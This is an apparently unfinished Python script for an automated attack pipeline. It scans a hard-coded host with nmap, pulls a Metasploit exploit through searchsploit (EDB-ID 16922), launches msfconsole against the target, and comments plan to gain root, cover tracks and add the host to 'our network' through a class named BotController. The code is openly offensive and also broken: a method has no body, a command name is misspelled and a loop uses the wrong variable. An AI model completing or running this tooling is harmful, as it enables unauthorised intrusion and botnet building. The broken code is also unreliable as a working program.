#/usr/bin/python3
# -*- coding: utf-8 -*- 
import subprocess
import os
import sys
import json

#global variables to be later changed to user input
hosts = ['10.10.10.2']
intensity = 'Loud'

#global variables for debugging
#some things don't need to be run every time for testing:
nmap_debug = 1
search_debug = 1
post_debug = 1

#msf needs its own special directory, goes here for now
msf_exploit_dir = '/root/.msf4/modules/exploits/private/'

#host object holds information about a target
class Host:

    def __init__(self, ip_addr, hostname):
        self.ip_addr = ip_addr
        self.open_ports = {}
        self.vulnerabilities = None
        self.hostname = hostname
        self.scanxml = hostname + '.xml'
        self.exploits_file = hostname + '.json'
        self.exploits = []
#has a flexible network scanner and parses data
#to format which is useful for metasploit
class NetworkScanner:

    def __init__(self):
        self.nmap_command = ''
        self.nmap_process = None
        self.target_info = ''
        self.output_type = '-oX' #outputs xml file
        self.options_list = {
            None: '-F',
            'Quiet' : '-sS -T3 -f',
            'Normal' : '-sV -T4 --script=banner',
            'Loud' : '-A -T5 --script=banner'
        }
        print('[+]Scanner initialized.')
    
    #main controller of the scanner
    def scan_network(self, host, options):
        #create command for nmap to execute
        self.nmap_command = 'nmap ' + \
            self.options_list[options] + ' ' + \
            str(host.ip_addr) + ' ' + \
            self.output_type + ' ' + \
            host.scanxml
        print('[*]' + self.nmap_command)
        #execute command and wait for it to finish
        if(not nmap_debug):
            self.nmap_process = subprocess.Popen(
                self.nmap_command,
                shell=True,
                stdout=subprocess.PIPE)
            sys.stdout.flush()
            print(self.nmap_process.communicate()) 
        else:
            pass
        return 0

#use data to find a useful exploit
class DatabaseFind:

    def __init__(self):
        print('[+]Finder initialized.')

    def search_database(self, host, attack_type):
        print('[+]Searching local exploit database')
        ssploit_cmd = 'searchsploit --nmap ' + str(host.scanxml) + ' --json'
        print('[+]' + ssploit_cmd)
        if(not search_debug):
            host.exploits = subprocess.check_output(ssploit_cmd.split()).decode('utf-8')
            sys.stdout.flush()
            with open(host.exploits_file, 'w') as fi:
                fi.write(str(host.exploits))
        else:
            pass
        self.output_to_json(host)
        self.choose_exploits(host)
        return 0

    #make the output into usable json
    def output_to_json(self, host):
        data_json = []
        #open the raw output file
        with open(host.exploits_file, 'r') as fi:
            #read the file minus the first two lines (they are garbage)
            data = '\n'.join(fi.read().splitlines()[2:])
            #each exploit is separated by 3 newline chars
            for exp in data.split('\n\n\n'):
                data_json.append(json.loads(exp))
        #now that we have a json object, loop through and add them
        #to information about the host
        for i in data_json: 
            if len(i['RESULTS_EXPLOIT']):
                for exp in i['RESULTS_EXPLOIT']:
                    if 'Metasploit' in exp['Title']: 
                        print('\n[*]EXPLOIT FOUND: ' + str(exp))
                        host.exploits.append(exp)
            if len(i['RESULTS_SHELLCODE']): 
                for shell in i['RESULTS_SHELLCODE']:
                    if 'Metasploit' in exp['Title']: 
                        print('[*]SHELLCODE FOUND: ' + str(shell))
    
    def choose_exploits(self, host):
        #pick the exploit to use
        #for now this will be hard-coded to use one exploit
        exploits = []
        exp_num = '16922' 
        if not (os.path.exists(msf_exploit_dir)):
            print('path not here!')
            os.makedirs(msf_exploit_dir)
        for exploit in host.exploits:
            if exploit['EDB-ID'] == exp_num:
                ssquery = "searchsploit -m " + exploit['EDB-ID']
                ssproc = subprocess.Popen(
                    ssquery.split(),
                    stdout = subprocess.PIPE)
                sys.stdout.flush()
                ssproc.communicate()
                with open(exp_num + '.rb', 'r') as file:
                    exploit = file.readlines()
                exploits.append(exploit[1].split()[2].split('.')[0])
                subprocess.call(['rm', exp_num + '.rb'])
        #mv_cmd = "mv /root/reu/" + exp_num + ".rb "  + msf_exploit_dir
        #subprocess.call(mv_cmd.split())
        #override the old exploit data
        host.exploits = exploits

#actually run the exploit against the target
class Exploit:

    def __init__(self):
        subprocess.call('msfrcpd -P lolol'.split())
        print('[+]Exploit framework initialized.')

    def exploit(self, host):
        #search for equivalent exploit

        #choose that exploit

        #fill out options for exploit

        #execute

        #keep session in background
        msf_cmd = 'msfconsole -x \
                "use exploit/unix/irc/'+host.exploits[0]+';\
                set RHOST 10.10.10.2;\
                exploit;"'
        output = subprocess.Popen(msf_cmd.split())
        print(output)
        
#if necessary, first gain root
#cover tracks
#install files and programs necessary to add host to our network
class PostExploitation:

    def __init__(self):
        print('[+]Created ')

    def load_files(self):



class BotController:

    def __init__(self, scanner, finder, exp, post_exp):
        self.scanner = scanner
        self.finder = finder
        self.exp = exp
        self.post_exp = post_exp
        print('[+]Controller created.')

    def exploit_target(self, host, attack_type):
        self.scanner.scan_network(host, attack_type)
        
        print('[+]The following services were found:')
        if(not post_debug):
            subprocess.Popen(['rm','-rf',msf_exploit_dir])

def console():
    #make sure user is root
    uid = os.getuid()
    print('[+]CONSOLE STARTED')
    if uid is not 0:
        print('[-]THIS PROGRAM REQUIRES ROOT PRIVILEGE')
        print('[-]YOUR UID IS: ' + str(uid))
        exit(1)

if __name__ == '__main__':
    #set everything up
    console()
    net_scan = NetworkScanner()
    data_search = DatabaseFind()
    exp = Exploit()
    post_exploit = PostExploitation()
    controller = BotController(net_scan, data_search, exp, post_exploit)
    #loop through hosts
    for ip in hosts:
        host = Host(ip, 'vulnerable')
        controller.exploit_target(host, intensity)

